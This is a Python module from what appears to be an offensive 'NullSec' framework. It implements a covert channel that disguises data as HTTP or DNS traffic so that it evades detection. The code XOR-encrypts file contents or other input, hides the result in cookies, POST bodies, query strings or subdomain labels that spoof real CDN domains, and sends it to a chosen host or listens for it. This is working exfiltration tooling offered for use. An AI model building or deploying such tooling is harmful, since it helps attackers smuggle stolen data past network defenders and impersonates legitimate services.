"""
NullSec Framework — Traffic Obfuscator Module
Disguise network traffic as legitimate protocols to evade detection.
"""

import socket
import ssl
import struct
import os
import json
import base64
import random
import hashlib
from datetime import datetime
from typing import Dict, Optional

try:
    from modules import BaseModule
except ImportError:
    from __init__ import BaseModule


class TrafficObfuscator(BaseModule):
    name = "obfuscator"
    description = "Network traffic obfuscation — encode data as DNS, HTTP, or HTTPS traffic"
    category = "stealth"
    version = "1.0.0"

    # Protocol disguise templates
    HTTP_TEMPLATES = [
        "GET /{path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nAccept: text/html\r\nAccept-Language: en-US\r\nCookie: session={data}\r\n\r\n",
        "POST /{path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {length}\r\n\r\ndata={data}",
        "GET /{path}?q={data}&lang=en HTTP/1.1\r\nHost: {host}\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0)\r\nAccept: application/json\r\n\r\n",
    ]

    HTTP_RESPONSE_TEMPLATES = [
        "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nServer: nginx/1.24.0\r\nX-Request-Id: {req_id}\r\nContent-Length: {length}\r\n\r\n<!-- cached -->{data}<!-- /cached -->",
        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nServer: Apache/2.4.57\r\nContent-Length: {length}\r\n\r\n{{\"status\":\"ok\",\"data\":\"{data}\",\"ts\":{ts}}}",
    ]

    # Fake cover domains
    COVER_DOMAINS = [
        "cdn.jsdelivr.net", "fonts.googleapis.com", "ajax.googleapis.com",
        "cdnjs.cloudflare.com", "unpkg.com", "stackpath.bootstrapcdn.com",
        "code.jquery.com", "maxcdn.bootstrapcdn.com",
    ]

    COVER_PATHS = [
        "npm/package/dist/bundle.min.js",
        "ajax/libs/font-awesome/6.0/css/all.min.css",
        "css2?family=Roboto:wght@400",
        "api/v2/stats.json",
        "analytics/collect",
        "wp-content/themes/default/style.css",
    ]

    def validate(self) -> bool:
        mode = self.get_option("mode", "encode")
        if mode not in ("encode", "decode", "listen", "send"):
            print("[!] Mode must be: encode, decode, listen, or send")
            return False
        return True

    def run(self, **kwargs) -> Dict:
        mode = self.get_option("mode", kwargs.get("mode", "encode"))
        protocol = self.get_option("protocol", kwargs.get("protocol", "http"))
        data = self.get_option("data", kwargs.get("data", ""))
        datafile = self.get_option("datafile", kwargs.get("datafile", ""))
        target = self.get_option("target", kwargs.get("target", ""))
        port = int(self.get_option("port", kwargs.get("port", 80)))
        key = self.get_option("key", kwargs.get("key", "nullsec"))

        if datafile:
            data = self._read_file(datafile)

        result = {
            "timestamp": datetime.utcnow().isoformat(),
            "mode": mode,
            "protocol": protocol,
        }

        if mode == "encode":
            encoded = self._encode(data, protocol, key)
            result["encoded"] = encoded
            result["original_size"] = len(data)
            result["encoded_size"] = len(encoded)
            result["overhead"] = f"{len(encoded)/max(len(data),1):.1f}x"
            print(f"[*] Encoded {len(data)} bytes as {protocol.upper()}")
            print(f"  [+] Output size: {len(encoded)} bytes ({result['overhead']} overhead)")
            print(f"\n{encoded[:500]}")

        elif mode == "decode":
            decoded = self._decode(data, protocol, key)
            result["decoded"] = decoded
            result["decoded_size"] = len(decoded)
            print(f"[*] Decoded {protocol.upper()} traffic")
            print(f"  [+] Recovered: {len(decoded)} bytes")
            print(f"\n{decoded[:500]}")

        elif mode == "send":
            if not target:
                print("[!] Target is required for send mode")
                result["error"] = "No target"
            else:
                sent = self._send_obfuscated(data, target, port, protocol, key)
                result["sent"] = sent
                print(f"[*] Sent {sent} obfuscated packets to {target}:{port}")

        elif mode == "listen":
            print(f"[*] Listening for obfuscated {protocol.upper()} on port {port}")
            received = self._listen(port, protocol, key)
            result["received"] = received

        return result

    def _encode(self, data, protocol, key):
        """Encode data as fake protocol traffic."""
        # XOR encrypt with key
        encrypted = self._xor_encrypt(data.encode() if isinstance(data, str) else data, key)
        b64_data = base64.urlsafe_b64encode(encrypted).decode()

        if protocol == "http":
            return self._encode_http(b64_data)
        elif protocol == "dns":
            return self._encode_dns(b64_data)
        elif protocol == "https":
            return self._encode_http(b64_data)  # Same wrapper, different transport
        else:
            return b64_data

    def _decode(self, data, protocol, key):
        """Decode obfuscated protocol traffic back to original data."""
        if protocol in ("http", "https"):
            b64_data = self._decode_http(data)
        elif protocol == "dns":
            b64_data = self._decode_dns(data)
        else:
            b64_data = data

        if not b64_data:
            return ""

        try:
            encrypted = base64.urlsafe_b64decode(b64_data)
            decrypted = self._xor_encrypt(encrypted, key)
            return decrypted.decode("utf-8", errors="replace")
        except Exception:
            return ""

    def _xor_encrypt(self, data, key):
        """XOR encrypt/decrypt data with key."""
        key_bytes = key.encode() if isinstance(key, str) else key
        key_hash = hashlib.sha256(key_bytes).digest()
        return bytes(b ^ key_hash[i % len(key_hash)] for i, b in enumerate(data))

    def _encode_http(self, b64_data):
        """Wrap data in HTTP request format."""
        domain = random.choice(self.COVER_DOMAINS)
        path = random.choice(self.COVER_PATHS)
        template = random.choice(self.HTTP_TEMPLATES)

        # Chunk data if too large for a single request
        chunks = [b64_data[i:i+512] for i in range(0, len(b64_data), 512)]
        requests = []

        for chunk in chunks:
            req = template.format(
                host=domain,
                path=path,
                data=chunk,
                length=len(chunk),
            )
            requests.append(req)

        return "\n---\n".join(requests)

    def _decode_http(self, http_data):
        """Extract data from HTTP-disguised traffic."""
        chunks = []

        # Try Cookie header
        for match in re.finditer(r'Cookie: session=([A-Za-z0-9_=-]+)', http_data):
            chunks.append(match.group(1))

        # Try POST body
        if not chunks:
            for match in re.finditer(r'data=([A-Za-z0-9_=-]+)', http_data):
                chunks.append(match.group(1))

        # Try query parameter
        if not chunks:
            for match in re.finditer(r'[?&]q=([A-Za-z0-9_=-]+)', http_data):
                chunks.append(match.group(1))

        # Try response body
        if not chunks:
            for match in re.finditer(r'<!-- cached -->(.+?)<!-- /cached -->', http_data, re.S):
                chunks.append(match.group(1))

        # Try JSON response
        if not chunks:
            for match in re.finditer(r'"data":"([^"]+)"', http_data):
                chunks.append(match.group(1))

        return "".join(chunks)

    def _encode_dns(self, b64_data):
        """Encode data as DNS query labels."""
        # Split into 63-char labels (DNS limit)
        labels = [b64_data[i:i+63] for i in range(0, len(b64_data), 63)]
        domain = random.choice(self.COVER_DOMAINS)

        queries = []
        for i, label in enumerate(labels):
            # Make it look like a subdomain query
            query = f"{label}.{i}.data.{domain}"
            queries.append(query)

        return "\n".join(queries)

    def _decode_dns(self, dns_data):
        """Decode data from DNS-style labels."""
        chunks = {}
        for line in dns_data.strip().split("\n"):
            parts = line.strip().split(".")
            if len(parts) >= 4:
                try:
                    data = parts[0]
                    seq = int(parts[1])
                    chunks[seq] = data
                except (ValueError, IndexError):
                    pass

        return "".join(chunks[k] for k in sorted(chunks))

    def _send_obfuscated(self, data, target, port, protocol, key):
        """Send obfuscated data to target."""
        encoded = self._encode(data, protocol, key)
        packets = encoded.split("\n---\n") if "\n---\n" in encoded else [encoded]

        sent = 0
        for packet in packets:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)

                if protocol == "https" and port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=target)

                s.connect((target, port))
                s.send(packet.encode())
                s.close()
                sent += 1
            except (socket.error, ssl.SSLError, OSError):
                pass

        return sent

    def _listen(self, port, protocol, key, timeout=30):
        """Listen for incoming obfuscated traffic."""
        received = []
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.settimeout(timeout)
            server.bind(("0.0.0.0", port))
            server.listen(5)
            print(f"  [*] Listening on 0.0.0.0:{port}...")

            while True:
                try:
                    conn, addr = server.accept()
                    data = conn.recv(4096).decode("utf-8", errors="replace")
                    conn.close()

                    decoded = self._decode(data, protocol, key)
                    if decoded:
                        received.append({
                            "from": f"{addr[0]}:{addr[1]}",
                            "data": decoded,
                            "timestamp": datetime.utcnow().isoformat(),
                        })
                        print(f"  [+] Received from {addr[0]}: {decoded[:60]}")
                except socket.timeout:
                    break
        except (socket.error, OSError) as e:
            print(f"  [!] Listen error: {e}")
        finally:
            try:
                server.close()
            except Exception:
                pass

        return received

    def _read_file(self, filepath):
        """Read data from file."""
        try:
            with open(filepath, "r") as f:
                return f.read()
        except FileNotFoundError:
            print(f"  [!] File not found: {filepath}")
            return ""


# Need re import at top
import re


if __name__ == "__main__":
    import sys
    obf = TrafficObfuscator()

    if len(sys.argv) > 1:
        obf.set_option("mode", sys.argv[1])
    if len(sys.argv) > 2:
        obf.set_option("data", sys.argv[2])
    if len(sys.argv) > 3:
        obf.set_option("protocol", sys.argv[3])

    if not obf.get_option("data"):
        obf.set_option("data", "NullSec Framework - covert channel test payload")
        obf.set_option("mode", "encode")

    result = obf.execute()
    print(json.dumps({k: v for k, v in result.items() if k != "encoded"}, indent=2, default=str))
